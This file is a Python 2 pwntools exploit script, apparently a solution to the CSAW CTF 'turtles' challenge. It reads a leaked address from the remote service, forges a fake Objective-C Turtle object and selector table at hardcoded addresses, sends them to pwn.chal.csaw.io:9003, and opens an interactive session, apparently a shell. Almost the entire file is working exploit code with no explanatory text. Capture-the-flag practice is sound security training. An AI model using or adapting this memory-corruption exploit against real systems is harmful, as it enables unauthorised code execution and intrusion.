#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('turtles')

host = args.HOST or 'pwn.chal.csaw.io'
port = int(args.PORT or 9003)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

offset1 = 0x43ea0

class Turtle(object):
    fields = {
        "OBJC_MetaClass_Turtle" : 0x0000000000601400,
        "OBJC_Class_NSObject" : None, # libs
        "OBJC_ClassName_Turtle" : 0x0000000000601321,
        "Unused1" : [0x0, 0x000001b00000000d, 0x0, 0x0],
        "OBJC_InstanceMethods_Turtle": 0x0000000000601480,
        "Heap" : None, # heap
        "Unused3" : [0x0, None, 0x0, 0x0, 0x0], # libs
        "Junk": [0x0, 0x0]
    }

    def __init__(self, base):
        self.base = base

    def get_object(self):
        self.fields['Heap'] = self.base + offset1

        s = ""
        for k in self.fields:
            if type(self.fields[k]) is list:
                l = self.fields[k]
                for i in range(len(l)):
                    if l[i] == None:
                        l[i] = 0x0
                s += ''.join([p64(x) for x in l])
            else:
                if self.fields[k] == None:
                    s += p64(0x0)
                else:
                    s += p64(self.fields[k])

        return s

class Selector(object):
    fields = [
        0x0000000a00000003, 0x0000000000601354,
        0x0000000c00000002, 0x0000000000601354,
        0x0000001500000068, 0x0000000000601349,
        0x0000000c00000000, 0x000000000060135c,
        0x0000000000000000, 0x0000000000000000,
    ]

    def __init__(self):
        pass

    def get_object(self):
        s = ''
        for i in self.fields:
            s += p64(i)

        return s


io = start()

io.recvuntil("Turtle: ")
addr = int(io.recvline().strip(), 16)

log.info(hex(addr))
t = Turtle(addr)
s = Selector()

io.send(t.get_object() + s.get_object())

io.interactive()

